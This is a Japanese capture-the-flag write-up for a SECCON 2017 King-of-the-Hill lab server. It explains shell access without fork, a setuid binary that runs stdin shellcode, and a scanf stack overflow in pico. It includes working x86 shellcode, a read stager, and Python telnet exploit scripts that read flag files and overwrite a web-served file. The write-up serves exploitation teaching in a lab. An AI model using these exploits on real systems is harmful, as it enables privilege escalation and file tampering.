@@ -1,0 +1,720 @@
+# SECCONxコロッセオ2017 サーバ弐
+
+King of the Hill(KoH)形式の問題。
+KoH形式は一種の攻防戦。
+問題を解くことで得られる攻撃点、問題サーバにある特定のファイルに対しチームごとに与えられるハッシュを書き込むことで得られる防御点がある。
+特に、後者においては一定時間ごとにハッシュ値が変わり、そのたびに点数を得ることができるため、ハッシュ値を書き込む操作をいかに自動化するかが重要になる。
+決められた点数をハッシュ値を書き込んだチーム数で割った値が得られる点数となるため、他のチームの妨害をすることも要点。
+
+
+## 事前準備
+VirtualBoxを使用し問題サーバを仮想マシンとして起動する。
+起動後、ユーザーroot、パスワードrootでログイン可能。
+ログイン後にipアドレスを確認して問題に取り掛かる。
+
+## 与えられている情報
+
+・問題サーバーのIPアドレス
+・11111/TCPで何らかのサービスがリッスンしていること
+
+問題ファイルダウンロード
+https://book.mynavi.jp/files/user/support/9784839962135/mondai3.zip
+
+
+## 解説
+### 問題サーバの調査
+ncコマンドを使い、問題サーバーの11111/TCPにアクセスする。
+接続後aと入力すると以下のように応答がある。
+
+$ nc <IPアドレス> 11111
+a[enter]
+/bin/ash: a: not found
+
+/bin/ashというシェル環境のエラーメッセージが表示されるため、シェルコマンドを実行することができると考えられる。
+idコマンドを使用し、どのような権限でプログラムが動作しているか確認してみる。
+しかし、次のようにうまく実行することができない。
+
+$ nc <IPアドレス> 11111
+id[enter]
+/bin/ash: can't fork
+
+このエラーメッセージから、fork操作(子プロセスを生成する操作)ができないことがわかる。したがって単純にはコマンドの実行ができない。forkを使用しない方法でプログラムを実行する方法を考える。
+その方法の1つとして、execコマンドを使用する方法がある。このコマンドは、引数に渡されたプログラムを自分自身と置き換えて実行するコマンド。つまり、新しいプロセスを生成する必要がないため、forkエラーを回避できる。
+
+$ nc <IPアドレス> 11111
+exec id[enter]
+uid=2886738243 gid=1001(busybox) groups=0(root)
+
+今度はうまく実行できる。しかしユーザーIDに違和感を感じる。
+また、gidはbusybox、そしてrootグループに所属していることがわかる。
+次にwhoamiコマンドも実行してみる。
+
+$ nc <IPアドレス> 11111
+exec whoami[enter]
+whoami: unknown uid 2886738243
+
+unknown uidと表示されたことから、存在しない可能性のあるユーザーの権限で動いていることがわかる。実行時にサーバー側で何らかの操作が行われていると思われる。続いて、unameコマンドを使用し、どのような環境で実行されているかも確認してみる。
+
+$ nc <IPアドレス> 11111
+exec uname -a[enter]
+Linux shellcode 4.4.45-0-virtgrsec #1-Alpine SMP Thu Jan 26 14:32:44 GMT 2017 i686 Linux
+
+結果から32bit版のAlpine Linuxが動作しているとわかる。
+実行環境の調査はここまでとし、ここからフラグを探していく。
+ひとまずlsコマンドをを使用し、また-alオプションを使って隠しファイルとそれぞれのファイルの詳細も表示してみる。
+
+$ nc <IPアドレス> 11111
+exec ls -al[enter]
+total 44
+drwxr-xr-x    2 busybox  busybox       4096 Jun 18  2017 .
+drwxr-xr-x    4 root     root          4096 Jun 18  2017 ..
+-r--r--r--    1 root     root            27 Mar  4  2017 keyword1.txt
+-r--------    1 nano     root            28 Mar  4  2017 keyword2.txt
+-r--------    1 pico     root            17 Mar  4  2017 keyword3.txt
+-r-sr-xr-x    1 nano     root          5176 Jun 18  2017 nano
+-r--r--r--    1 nano     root           221 Jun 18  2017 nano.c
+-r-sr-xr-x    1 pico     root          5224 Jun 18  2017 pico
+-r--r--r--    1 pico     root           516 Jun 18  2017 pico.c
+
+たくさんのファイルが見つかる。
+keyword1.txt、keyword2.txt、keyward3.txtという3つのファイルにフラグが含まれていそうである。
+3つあるファイルを順に追ってみる。
+
+
+下調べの結果から、keyword1.txtが読めそうである。catコマンドで読んでみる。
+
+$ nc <IPアドレス> 11111
+exec cat keyword1.txt[enter]
+SECCON{connect_port_22222}
+
+1つ目のフラグを得ることができる。
+
+
+1つ目のフラグを見ると、22222番ポートへつなげ、という指示がある。
+
+$ nc <IPアドレス> 22222
+a[enter]
+/bin/ash: a: not found
+id[enter]
+
+11111番ポートと同様にシェルが動作している。
+idコマンドを実行してみる。
+
+$ nc <IPアドレス> 22222
+id[enter]
+uid=2886738243 gid=1001(busybox) groups=0(root)
+
+こちらではforkエラーが表示されないことからexecコマンドが必要ない。whoami、lsも実行してみる。
+
+$ nc <IPアドレス> 22222
+whoami
+whoami: unknown uid 2886738243
+ls -al
+total 44
+drwxr-xr-x    2 busybox  busybox       4096 Jun 18  2017 .
+drwxr-xr-x    4 root     root          4096 Jun 18  2017 ..
+-r--r--r--    1 root     root            27 Mar  4  2017 keyword1.txt
+-r--------    1 nano     root            28 Mar  4  2017 keyword2.txt
+-r--------    1 pico     root            17 Mar  4  2017 keyword3.txt
+-r-sr-xr-x    1 nano     root          5176 Jun 18  2017 nano
+-r--r--r--    1 nano     root           221 Jun 18  2017 nano.c
+-r-sr-xr-x    1 pico     root          5224 Jun 18  2017 pico
+-r--r--r--    1 pico     root           516 Jun 18  2017 pico.c
+
+whoamiコマンドの結果から、このサービスにおいてもサーバー側でユーザーIDを細工していると推測できる。
+keyword2.txt、keyword3.txtに2つ目、3つ目のフラグがありそうだが、パーミッションからそれぞれnano、picoユーザーのみ閲覧可能とわかる。また、x(実行権限)の付いているnano、picoというファイルが存在する。そしてそれぞれスティッキービットが立っている。したがって、これらが実行可能ファイルであれば所有者の権限で実行できる。
+脆弱性が存在する場合、それぞれのユーザーの権限で任意の操作を行うことができる。加えて、nano.c、pico.cという2つのファイルが存在する。ファイル名から、前述したnano、picoのソースコードの可能性がある。
+nanoから見ていく。
+
+
+サーバーからnano.c、nanoをローカルに落とし、解析してみる。
+
+$ echo "cat nano.c; exit" | nc <IPアドレス> 22222 > nano.c
+$ echo "cat nano; exit" | nc <IPアドレス> 22222 > nano
+
+はじめにnano.cを読んでみる。
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+[nano.c]
+int main(void)
+{
+        char shellcode[140];
+        fread(shellcode, 1, 140, stdin);
+        setreuid(geteuid(), -1);
+        (*(void (*)())shellcode)();
+        return 0;
+}
+
+これは、標準入力から140バイト読み込み、それを実行コードとして実行するプログラム。また、setreuid関数が実行されている。したがって、スティッキービットが立っていることから、setreuid関数が実行されるまでは実ユーザーIDが2886738243、その後は10003(nanoのUID)で動く。
+実行ファイルについても調べてみる。fileコマンド、checksecコマンド(https://github.com/slimm609/checksec.sh)、lddコマンドを使用する。
+checksecについては、pedaのものを使っても構わない。
+
+$ file nano
+nano: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped
+
+$ checksec --file=nano
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   No Symbols      No      0               1       nano
+
+$ ldd nano
+        linux-gate.so.1 (0xf7f2c000)
+        libc.musl-x86.so.1 => not found
+
+
+nanoは32bitのプログラム。stripされシンボル情報が削除されている。また、musl libc(https://www.musl-libc.org/)を使用している。これは、Cの標準ライブラリの一種であり、GNU C Libraryなどに比べ軽量、高速、またシンプルという特徴がある。
+Ubuntu 16.04 x86_64環境の場合、次のコマンドでインストールすることが可能。
+
+$ sudo apt-get install musl:i386
+
+また、checksecの結果から、NXビットが立っていないことがわかる。
+次に、objdumpでnanoのmain関数を見てみる。nanoはnano.cをコンパイルしたものであることを確認する。
+
+
+nano:     file format elf32-i386
+
+(省略)
+
+00000640 <main>:
+ 640:   8d 4c 24 04             lea    ecx,[esp+0x4]
+ 644:   83 e4 f0                and    esp,0xfffffff0
+ 647:   ff 71 fc                push   DWORD PTR [ecx-0x4]
+ 64a:   55                      push   ebp
+ 64b:   89 e5                   mov    ebp,esp
+ 64d:   53                      push   ebx
+ 64e:   51                      push   ecx
+ 64f:   81 ec 90 00 00 00       sub    esp,0x90
+ 655:   e8 6b fe ff ff          call   4c5 <_init+0xa9>
+ 65a:   81 c3 62 19 00 00       add    ebx,0x1962
+ 660:   8b 83 20 00 00 00       mov    eax,DWORD PTR [ebx+0x20]
+ 666:   8b 00                   mov    eax,DWORD PTR [eax]
+ 668:   50                      push   eax
+ 669:   68 8c 00 00 00          push   0x8c
+ 66e:   6a 01                   push   0x1
+ 670:   8d 85 6c ff ff ff       lea    eax,[ebp-0x94]
+ 676:   50                      push   eax
+ 677:   e8 e4 fd ff ff          call   460 <_init+0x44>
+ 67c:   83 c4 10                add    esp,0x10
+ 67f:   e8 bc fd ff ff          call   440 <_init+0x24>
+ 684:   83 ec 08                sub    esp,0x8
+ 687:   6a ff                   push   0xffffffff
+ 689:   50                      push   eax
+ 68a:   e8 d9 fd ff ff          call   468 <_init+0x4c>
+ 68f:   83 c4 10                add    esp,0x10
+ 692:   8d 85 6c ff ff ff       lea    eax,[ebp-0x94]
+ 698:   ff d0                   call   eax
+ 69a:   b8 00 00 00 00          mov    eax,0x0
+ 69f:   8d 65 f8                lea    esp,[ebp-0x8]
+ 6a2:   59                      pop    ecx
+ 6a3:   5b                      pop    ebx
+ 6a4:   5d                      pop    ebp
+ 6a5:   8d 61 fc                lea    esp,[ecx-0x4]
+ 6a8:   c3                      ret
+ 6a9:   55                      push   ebp
+ 6aa:   e8 89 ff ff ff          call   638 <_init+0x21c>
+ 6af:   05 0d 19 00 00          add    eax,0x190d
+ 6b4:   89 e5                   mov    ebp,esp
+ 6b6:   53                      push   ebx
+ 6b7:   52                      push   edx
+ 6b8:   8d 98 48 ff ff ff       lea    ebx,[eax-0xb8]
+ 6be:   83 eb 04                sub    ebx,0x4
+ 6c1:   8b 03                   mov    eax,DWORD PTR [ebx]
+ 6c3:   83 f8 ff                cmp    eax,0xffffffff
+ 6c6:   74 04                   je     6cc <main+0x8c>
+ 6c8:   ff d0                   call   eax
+ 6ca:   eb f2                   jmp    6be <main+0x7e>
+ 6cc:   58                      pop    eax
+ 6cd:   5b                      pop    ebx
+ 6ce:   5d                      pop    ebp
+ 6cf:   c3                      ret
+
+この結果から、nanoはnano.cをコンパイルしたものであることがわかった。
+シェルコードを書いてみる。
+
+今回は読むべきファイル名もわかっているため、open、read、writeシステムコールを使用する。以下にシェルコードの一例を示す。
+
+[shellcode_nano.S]
+BITS 32                                                                  [0/921]
+
+_start:
+        sub     esp, 0x40
+
+        ;; open('keyword2.txt');
+        xor     eax, eax
+        push    eax
+        push    0x7478742e
+        push    0x3264726f
+        push    0x7779656b
+        mov     eax, 5
+        mov     ebx, esp
+        xor     ecx, ecx
+        xor     edx, edx
+        int     0x80
+
+        ;; read(fd, buf, 0x20);
+        mov     ebx, eax
+        mov     eax, 0x3
+        mov     ecx, esp
+        mov     edx, 0x20
+        int     0x80
+
+        ;; write(1, buf, len);
+        mov     edx, eax
+        mov     eax, 0x4
+        mov     ebx, 0x1
+        int     0x80
+
+exit:
+        ;; exit(0)
+        mov     eax, 1
+        mov     ebx, 0
+        int 0x80
+
+
+次のようにアセンブルする。
+
+$ nasm shellcode_nano.S
+
+リモートで実行させるために、次のようなプログラムを作成する。
+
+
+[exploit_nano.py]
+#! python3
+import telnetlib
+import time
+
+def exploit(tn):
+
+        s = tn.get_socket()
+        with open('shellcode_nano', 'rb') as f:
+                sc = f.read()
+        sc += b'\x90'*(140-len(sc))
+        s.send(b'./nano\n')
+        time.sleep(0.5)
+
+        s.send(sc + b'\n')
+
+        print(s.recv(2048))
+
+def main():
+        tn = telnetlib.Telnet('172.16.33.91', 22222)
+        exploit(tn)
+
+if __name__ == '__main__':
+        main()
+
+
+実行してみる。
+
+$ python exploit_nano.py
+SECCON{nano_easy_shellcode}
+
+
+これで2つ目のフラグを取得することができた。
+
+
+pico、pico.cをローカルに落とす。
+
+$ echo "cat pico.c; exit" | nc <IPアドレス> 22222 > pico.c
+$ echo "cat pico; exit" | nc <IPアドレス> 22222 > pico
+
+
+[pico.c]
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int auth(char *user, char *pass)
+{
+  printf("user: %s\n", user);
+  printf("pass: %s\n", pass);
+}
+
+int evil()
+{
+   printf("H@ck3d!!!\n");
+   exit(1);
+}
+
+int input()
+{
+  int a = 0x33333333;
+  int b = 0x44444444;
+  char user[8] = "";
+  char pass[8] = "";
+
+  setreuid(geteuid(), -1);
+
+  printf("addr: 0x%08x\n", (unsigned int)pass);
+  scanf("%s", user);
+  scanf("%s", pass);
+
+  auth(user, pass);
+}
+
+int main() {
+  input();
+}
+
+
+標準入力からユーザー名、パスワードを受け取りそれらを出力するプログラム。
+setreuid関数を実行している。また、配列passの先頭アドレスを出力している。
+そしてその後、scanf関数が呼ばれている。
+よく見ると、書式文字列として%sが使われている。ということは、入力された文字列の長さを検証していない。したがって、Stackベースのバッファオーバーフローの脆弱性があると言える。
+
+picoについても調べてみる。
+
+
+$ file pico
+pico: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped
+
+$ checksec --file=pico
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   No Symbols      No      0               1       pico
+
+$ ldd pico
+        linux-gate.so.1 (0xf7f35000)
+        libc.musl-x86.so.1 => not found
+
+
+nano同様32bitのプログラムであり、先程同様stripされている。他にもmusllibcを使用していることがわかる。またNXビットが立っていない。バッファオーバーフローを利用し、シェルコードを実行するという方法が浮かぶ。他にはPIEが有効になっているため、どのセグメントのアドレスもランダムになってしまう。しかし、配列passの先頭アドレスが表示されることから、スタックのアドレスがわかる。
+したがって、スタックにシェルコードを設置し、バッファオーバーフローの脆弱性を利用してリターンアドレスをシェルコードに向けるようにすればよい。
+
+$ chmod u+x pico
+
+gdbを使って動的解析をしてみる。ソースコードから、配列user、passへの読み込みのところでバッファオーバーフローがあるのは明白なため、今回は配列userに対し長い文字列を入れてみる。
+
+$ gdb -q ./pico
+gdb-peda$ r
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+B
+
+EIPが0x41414141になっている。簡単に制御を奪うことができた。
+次にリターンアドレスを書き換えるには何byte必要か調査する。picoのinput関数を調べてみる。stripされているため、main関数から追う。
+
+gdb-peda$ disas main
+gdb-peda$ x/50i 0x708
+
+逆アセンブルの結果により、0x708から始まる関数がinput関数と考えられる。
+また、input関数におけるスタックレイアウトを図示すると次のようになる。
+
+位置		内容
+ebp-0x20	配列pass
+ebp-0x18	配列user
+ebp-0x10	0x44444444
+ebp-0xc		0x33333333
+ebp-0x8		?
+ebp-0x4		saved ebx
+ebp		saved ebp
+ebp+0x4		return addr
+
+ということは、配列userからリターンアドレスまでの距離は
+
+0x4-(-0x18) = 0x1c
+
+となる。これより長い入力を行うことで、リターンアドレスを書き換えられる。
+また、次のようなスタックレイアウトを作ることでシェルコードが実行できる。
+
+位置		内容
+ebp-0x20	配列pass
+ebp-0x18	配列user
+ebp-0x10	0x41414141
+ebp-0xc		0x41414141
+ebp-0x8		0x41414141
+ebp-0x4		0x41414141
+ebp		0x41414141
+ebp+0x4		配列passのアドレス+0x20+0x8 (shellcodeの先頭アドレス)
+ebp+0x8		shellcode
+
+exploitを組み立てていく。
+
+
+今回シェルコードを組み立てる上で注意しなければならないのは、scanf関数では、書式文字列として%sが指定されているため、使用可能な文字列に制限がある。例えば、0x0(NULL)、0x20(スペース)、0x0a(改行)といった文字列は、入力の終端文字列として判定されるため使用できない。
+これを回避する方法として、次の2つがある。
+
+・使用可能文字列のみでシェルコードを構築する
+・stagerを使う
+
+今回は、stagerを使う。
+
+
+stagerとは、readシステムコールなどを呼ぶことでユーザからの入力をメモリ上に設置し、そこに制御を移す手法。これは、脆弱性がある箇所で入力可能な文字の長さに制限がある場合などに有効。また、シェルコードに比べ短いため、今回のように使用可能な文字列のみでフラグを読むシェルコードを書くよりも、そのようなstagerを作成するほうが楽になる。
+今回は以下のstagerを使用する。0x80byte分読み込み、読み込み先のアドレスに制御を移すコード。
+
+
+stager.S
+BITS 32
+
+start:
+	sub	esp, 0x80
+	xor	eax, eax
+	xor	ebx, ebx
+	mov 	al, 0x3
+	mov	ecx, esp
+	add	dl, 0x80
+	mov	dl, 0xff
+	int	0x80
+	push	ecx
+	ret
+
+
+shellcode_pico.S
+BITS 32
+
+_start:
+        sub     esp, 0x40
+
+        ;; open('keyword3.txt');
+        xor     eax, eax
+        push    eax
+        push    0x7478742e
+        push    0x3364726f
+        push    0x7779656b
+        mov     eax, 5
+        mov     ebx, esp
+        xor     ecx, ecx
+        xor     edx, edx
+        int     0x80
+
+        ;; read(fd, buf, 0x20);
+        mov     ebx, eax
+        mov     eax, 0x3
+        mov     ecx, esp
+        mov     edx, 0x20
+        int     0x80
+
+        ;; write(1, buf, 0x20);
+        mov     edx, eax
+        mov     eax, 0x4
+        mov     ebx, 0x1
+        int     0x80
+
+exit:
+        ;; exit(0)
+        mov     eax, 1
+        mov     ebx, 0
+	int	0x80
+
+2つのプログラムをアセンブルする。
+
+$ nasm stager.S
+$ nasm shellcode_pico.S
+
+
+リモートで実行させるコードを書く。
+
+[exp.py]
+#! python3
+
+import telnetlib
+import time
+import struct
+
+def pI(addr):
+    return struct.pack('<I', addr)
+
+def exploit(tn):
+    s = tn.get_socket()
+    with open('stager', 'rb') as f:
+        stager = f.read()
+    with open('shellcode_pico', 'rb') as f:
+        sc = f.read()
+
+    s.send(b'./pico\n')
+    time.sleep(0.5)
+
+    tn.read_until(b'addr: ')
+
+    addr_pass = int(tn.read_until(b'\n')[:-1], 16)
+
+    print('Address of Pass : {0}'.format(hex(addr_pass)))
+
+    payload1  = b'A'*0x1c
+    #payload1 += pI(addr_pass+0x20+8)
+    payload1 += pI(addr_pass+0x20+0x8)
+    payload1 += b'\x90'*0x30
+    payload1 += stager
+
+    # user
+    s.send(payload1 + b'\n')
+
+    time.sleep(0.5)
+
+    # pass
+    s.send(b'A\n')
+
+    payload2  = b''
+    payload2 += b'\x90'*0x30
+    payload2 += sc
+
+    s.send(payload2)
+
+    print(s.recv(2048))
+
+def main():
+    tn = telnetlib.Telnet('172.16.33.67', 22222)
+    exploit(tn)
+
+if __name__ == '__main__':
+    main()
+
+
+実行してみる。
+
+$ python exp.py
+Address of Pass : 0xbffffd48
+b'SECCON{pico_BoF}\n'
+
+これですべてのフラグを回収できた。
+
+
+◽️チームキーワードの書き込み
+ここまでに、攻撃ポイントとなる3つのフラグを探してきた。
+ここでは防御点となるチームキーワードの書き込みを行う。
+書き込まれたチームキーワードは次のところに表示されていた。
+
+http://<IPアドレス>/flag.txt
+
+URLからファイル名が推測できるためfindコマンドで探す。
+
+$ nc <IPアドレス> 22222
+find / -name flag.txt
+find: /boot/lost+found: Permission denied
+find: /home/takesako: Permission denied
+		:
+/usr/share/nginx/html/flag.txt
+
+
+詳しく見てみる。
+$ nc <IPアドレス> 22222
+ls -al /usr/share/nginx/html/flag.txt
+-rw-r--r--    1 pico     root            15 Mar  4  2017 /usr/share/nginx/html/flag.txt
+
+ユーザーpicoの所有物であり、所有者のみ書き込みが可能。
+よってpicoの脆弱性を利用し、書き込むことができそう。
+シェルコードを書いていく。
+
+picoの脆弱性攻撃において使用可能な文字種に制限がある。
+よって、先と同じstagerを使う。
+また、チームキーワードを書き込むシェルコードは、次のような方針で書いてみる。
+1.標準入力から書き込むキーワードを受け取りスタックに置く
+2./usr/share/nginx/html/flag.txtを開く
+3.スタックに置いたキーワードをファイルに書き込む
+以下にシェルコードの一例を示す。
+
+[shellcode_pico2.S]
+BITS 32
+
+_start:
+        sub     esp, 0x40
+
+        ;; read(0, buf, 0x40)
+        mov     ebx, 0
+        mov     eax, 0x3
+        mov     ecx, esp
+        mov     esi, esp
+        mov     edx, 0x40
+        int     0x80
+
+        ;; open('/usr/share/nginx/html/flag.txt');
+        mov     edi, eax
+        xor     eax, eax
+        push    eax
+        push    0x7478
+        push    0x742e6761
+        push    0x6c662f6c
+        push    0x6d74682f
+        push    0x786e6967
+        push    0x6e2f6572
+        push    0x6168732f
+        push    0x7273752f
+        mov     ebx, esp
+        mov     eax, 5
+        mov     ecx, 1025
+        int     0x80
+
+        ;; write(fd, buf, 0x40)
+        mov     ecx, esi
+        mov     ebx, eax
+        mov     edx, edi
+        mov     eax, 0x4
+        int     0x80
+
+exit:
+        ;; exit(0)
+        mov     eax, 1
+        mov     ebx, 0
+        int     0x80
+
+
+アセンブルしておく。
+$ nasm shellcode_pico2.S
+
+リモートで実行させるコードを書く
+[write_flag.py]
+#! python3
+import telnetlib
+import time
+import struct
+import sys
+
+def pI(addr):
+    return struct.pack('<I', addr)
+
+def exploit(tn, keyword):
+    s = tn.get_socket()
+    with open('stager', 'rb') as f:
+        stager = f.read()
+    with open('shellcode_pico2', 'rb') as f:
+        sc = f.read()
+    s.send(b'./pico\n')
+    time.sleep(0.5)
+    tn.read_until(b'addr: ')
+    addr_pass = int(tn.read_until(b'\n')[:-1], 16)
+    print('Address of Pass : {0}'.format(hex(addr_pass)))
+
+    payload1  = b'A'*0x1c
+    payload1 += pI(addr_pass+0x20+8)
+    payload1 += b'\x90'*0x30
+    payload1 += stager
+
+    # user
+    s.send(payload1 + b'\n')
+    time.sleep(0.5)
+
+    # pass
+    s.send(b'A\n')
+
+    payload2  = b''
+    payload2 += b'\x90'*0x30
+    payload2 += sc
+    payload2 += b'b'*0x10
+
+    s.send(payload2)
+    time.sleep(0.5)
+    s.send(keyword.encode() + b'\n')
+
+def main(keyword):
+    tn = telnetlib.Telnet('172.16.33.91', 22222)
+    exploit(tn, keyword)
+
+if __name__ == '__main__':
+    if (len(sys.argv)) == 2:
+        main(sys.argv[1])
+
+プログラムを実行してみる。引数に書き込みたいワードを与える。
+
+$ curl http://<IPアドレス>/flag.txt
+shellcode flag
+$ python write_flag.py Pwned!
+Address of Pass : 0xbffffd48
+$ curl http://<IPアドレス>/flag.txt
+shellcode flag
+Pwned!
+
+実際のCTFでは、最後のチームキーワードの書き込みを自動化すること、場合に応じて他のチームの妨害を行っていくことになる。
+妨害については、ルールの範囲内で行う必要がある。サーバに高い負荷を与える行為などは原点に繋がる場合もあるため注意が必要。
+
